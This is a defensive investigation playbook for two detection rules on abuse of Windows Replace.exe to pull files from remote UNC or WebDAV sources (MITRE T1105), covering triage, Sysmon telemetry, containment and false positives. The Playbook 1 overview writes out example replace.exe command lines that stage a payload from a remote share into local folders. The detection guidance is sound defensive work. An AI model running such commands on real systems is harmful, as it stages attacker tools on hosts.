# T1105 — Ingress Tool Transfer · LOLBin: Replace.exe (File Replacement Utility)
**Rules Covered:**  
- CNC-E-2726320-186 — Replace.exe UNC/WebDAV Source with `/A` (Process Creation)  
- CNC-E-2726320-187 — Replace.exe Network Connection (Sysmon EID 3)  
**Last updated:** 2025-10-28 16:28 UTC

> `Replace.exe` is a legacy Microsoft utility that replaces files in a destination directory with a specified **source file**.  
> Normal usage targets **local** paths. When the source is a **remote UNC or WebDAV** path, `Replace.exe` (or helper services) can **fetch content over the network**,
> enabling a trusted binary to stage payloads as part of **T1105 — Ingress Tool Transfer**. The `/A` switch adds files that do not already exist, which can be
> abused to introduce **new artifacts** into otherwise controlled directories.

---

## Playbook 1 — Replace.exe UNC/WebDAV Source with `/A` (Process Creation)

### Overview
Investigate **process creation** of `Replace.exe` where the **source path** in the command line is **remote** and the `/A` switch is present. Examples:
- `replace.exe \\server\share\payload.bin C:\ProgramData\ /A`
- `replace.exe \\host@SSL\DavWWWRoot\drop\cfg.dat C:\Users\Public\ /A` (WebDAV over HTTPS)

This pattern indicates **remote sourcing** of content with an explicit intent to **add** new files if missing.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** showing `Image`, full `CommandLine`, `ParentImage`, `User`, integrity level, CWD, timestamp.  
2. **Parse paths:** Identify **source** (UNC/WebDAV) and **destination** (local folder). Classify **internal vs external** host; flag **raw IPs** and **non‑standard ports**.  
3. **Secure artifacts:** Snapshot the **destination directory**; copy & **hash** any files modified/created within ±5 minutes; record pre/post size and timestamps.

### Investigation Steps
#### 1) Process & Lineage
- Validate `Image` path/signature (typically `C:\\Windows\\System32\\replace.exe` on systems where present).  
- Review **parent** (script hosts, Office, RMM, scheduled tasks) and execution context (user vs elevated).  
- Confirm whether execution occurred **off‑hours** or on servers without a reason to run `replace.exe`.

#### 2) Command‑Line Semantics
- Confirm `/A` usage (adds new files) and look for other switches: `/P` (prompt), `/R` (read‑only), `/S` (subdirs), `/W` (wait).  
- Validate intent of **destination path** (sensitive locations like `System32`, `Program Files`, `C:\ProgramData`, user start‑up folders).  
- For **WebDAV** (`@SSL\DavWWWRoot`), downloads may be brokered by **WebClient** service (`svchost.exe`) over **80/443**.

#### 3) Network & DNS
- Correlate with **Sysmon EID 3** egress attributed to `replace.exe` (rare) or helper processes (WebClient).  
- Use **Sysmon EID 22** DNS (or proxy FQDN in explicit proxy environments).  
- Inspect **proxy** logs (URL/SNI, method/status/bytes) for the same host/time window.

#### 4) Artifact & Execution
- Review **Sysmon EID 11** for created/modified files in the destination; verify **extension↔MIME** and **Zone.Identifier** ADS.  
- Hunt for **follow‑on execution** of newly added binaries/scripts (EDR child processes, module loads).

#### 5) Fleet Correlation
- Pivot by **source host/share**, **file names**, **hashes**, and **CLI substrings** across endpoints to find coordinated staging.

### Key Artifacts
- **Sysmon EID 1 / 4688:** Process creation with full CLI and parent.  
- **Sysmon EID 11:** File create/modify in destination (new payloads).  
- **Sysmon EID 3 / Proxy:** SMB/WebDAV egress to the remote source.  
- **Sysmon EID 22:** DNS lookups aligned with execution.

### Containment Actions
- **Block** destination hosts; **quarantine** newly added files; **terminate** related processes; consider **host isolation** if execution occurred.

### Prevention Measures
- Egress filtering; disable **WebClient** where unnecessary; restrict `replace.exe` via **AppLocker/WDAC** on user endpoints.  
- Monitor for **rare process → remote path** usage and **writes to sensitive dirs**.

### Recovery
- Remove staged artifacts/persistence; restore directories from baseline; tune detections and allowlists.

### False Positives
- Legitimate IT scripts performing **intranet** updates to shared application directories using UNC (with documented change tickets).

---

## Playbook 2 — Replace.exe Network Connection (Sysmon EID 3)

### Overview
This playbook investigates **outbound connections** attributed to `Replace.exe`. The tool is primarily a file operation utility; **network egress** implies it is being used with a **remote source**,
possibly to stage payloads (T1105) before replacing/adding into local directories.

### Initial Response
1. **Capture records:** Export **EID 3** (dest IP/host/port/proto) and correlate with **EID 1/4688** for `replace.exe`.  
2. **Classify destination:** Internal vs external; highlight **raw IPs**, **new/rare domains**, **non‑standard ports**.  
3. **Scope role:** Determine if the host/script routinely uses `replace.exe` for **intranet** file propagation.

### Investigation Steps
#### 1) Process & Command Context
- Retrieve full **command line** and **parent**; identify **source** and **destination** paths.  
- Confirm `/A` or other switches that indicate adding/replacing across directories or subdirs.

#### 2) Destination Validation
- For **SMB**, validate **445** sessions and specific share paths accessed.  
- For **WebDAV**, pivot to **WebClient** telemetry (ports **80/443**) and consult **proxy** logs for request details.

#### 3) Artifact Discovery
- Inspect **Sysmon EID 11** for created/modified files in target directories; **hash** and analyze contents.  
- Check for **follow‑on execution** or lateral movement using newly written files.

#### 4) Correlation & Fleet
- Pivot by **destinations**, **file names**, **hashes**, and **parent** processes to uncover broader campaigns.

### Key Artifacts
- **Sysmon EID 3:** Egress details (Image, dest IP/host, port).  
- **Sysmon EID 1 / 4688:** Process creation / CLI context.  
- **Sysmon EID 11:** File write events post‑connection.  
- **Sysmon EID 22 / Proxy:** DNS and HTTP(S) observables.

### Containment Actions
- **Block** endpoints; **quarantine** suspicious payloads; **terminate** activity; consider **host isolation** if execution is indicated.

### Prevention Measures
- Limit use of `replace.exe` to approved admin contexts; enforce **egress controls**; alert on **Internet‑zone** sources.  
- Monitor for writes to **ProgramData**, **startup** and **system** paths.

### Recovery
- Remove artifacts/persistence; validate integrity of replaced files; tune rules and allowlists.

### False Positives
- Admin‑driven updates from **trusted** intranet shares; validate and allowlist per change management.